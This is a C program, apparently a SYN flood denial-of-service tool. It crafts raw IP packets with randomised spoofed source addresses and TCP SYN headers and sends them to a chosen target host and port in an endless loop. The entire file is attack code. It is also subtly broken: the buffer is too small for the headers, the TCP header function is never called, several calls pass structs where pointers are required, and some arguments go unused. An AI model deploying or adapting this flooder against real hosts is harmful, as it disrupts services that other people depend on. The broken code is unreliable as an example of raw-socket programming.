#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <string.h>
#include <arpa/inet.h>
#include <linux/tcp.h>
#include <syslog.h>
 
#define BUFFER_SIZE 20
#define PACKET_DELAY 30
#define THREAD_NUM 100
 
static char buf[BUFFER_SIZE];
 
static char *usage = "\nUsage: ./tcp <target> <target_port> <src_port>\n \
	<target> = target IP address\n \
	<target_port> = target port\n \
	<src_port> = src port\n";
 
static unsigned short check_sum(unsigned short *addr,int len){
        register int nleft=len;
        register int sum=0;
        register short *w=addr;
        short answer=0;

        while(nleft>1)
        {
                sum+=*w++;
                nleft-=2;
        }
        if(nleft==1)
        {
                *(unsigned char *)(&answer)=*(unsigned char *)w;
                sum+=answer;
        }

        sum=(sum>>16)+(sum&0xffff);
        sum+=(sum>>16);
        answer=~sum;
        return(answer);
}

static void set_ip_header(struct sockaddr_in *dst)
{
    struct ip *ip = (struct ip *)buf;
    // IP Layer
    ip->ip_v = 4;
    ip->ip_hl = sizeof(struct ip) >> 2;
    ip->ip_tos = 0;
    ip->ip_len = htons( sizeof(struct ip) + sizeof(struct tcphdr));
    ip->ip_id = htons(4321);
    ip->ip_off = htons(0);
    ip->ip_ttl = MAXTTL;
    ip->ip_p = IPPROTO_TCP;
    ip->ip_src.s_addr = random();
    ip->ip_dst = dst->sin_addr;
    ip->ip_sum = 0; /* Let kernel fill in */
 }

 static void set_tcp_header(struct sockaddr_in *dst){
    // TCP Layer
    struct tcphdr *tcp = (struct tcphdr*)(buf + sizeof(struct ip));
    tcp->source = htons(8888);
    tcp->dest = dst->sin_port;
    tcp->seq = random();
    tcp->doff = 5;
    tcp->syn = 1;
    tcp->check = 0;
    tcp->check=check_sum((unsigned short*)tcp,sizeof(struct tcphdr));
}
 
static void set_socket_options(int sockfd)
{
    openlog("setSocketOptions",LOG_CONS | LOG_PID, 0);
    const int on = 1;
 
    // Enable broadcast
    if(setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)) < 0){
        syslog(LOG_USER, "setsockopt for BROADCAST error");
        closelog();
        exit(1);
    }
 
    // socket options, tell the kernel we provide the IP structure 
    if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
        syslog(LOG_USER, "setsockopt for IP_HDRINCL error");
        closelog();
        exit(1);
    }	
}
 
int main(int argc, char *argv[])
{
    int sockfd;
    
    struct hostent *target;
    struct sockaddr_in dst;
 
    if(argc != 4){
        fprintf(stdout, "%s\n",usage);
        exit(1);
    }
    // Clear data payload
    memset(buf, 0, sizeof(buf));
    bzero(&dst, sizeof(struct sockaddr_in));

    if((target = gethostbyname(argv[1])) == NULL){
        if(inet_addr(argv[1]) == -1){
            fprintf(stderr, "%s: Can't resolve, unknown host.\n", argv[2]);
            exit(1);
        }
    }else{
        memcpy(dst.sin_addr, target->h_addr_list[0], target->h_length);
        dst.sin_family=AF_INET;
        dst.sin_port=htons(atoi(argv[2]));
    }

    // Create TCP socket 
    if((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0){
        perror("create socket error");
        exit(1);
    }

    set_socket_options(sockfd);
   
    set_ip_header(&dst);
    
	// Loop
    while(1){
        if(sendto(sockfd, buf, sizeof(buf), 0, (struct sockaddr *)dst, sizeof(struct sockaddr_in)) < 0){
            fprintf(stderr, "Error during packet send.\n");
            perror("sendto error");
        }else
            printf("send packgets is OK.\n");

        usleep(PACKET_DELAY);
    }
    close(sockfd);
    return 0;
}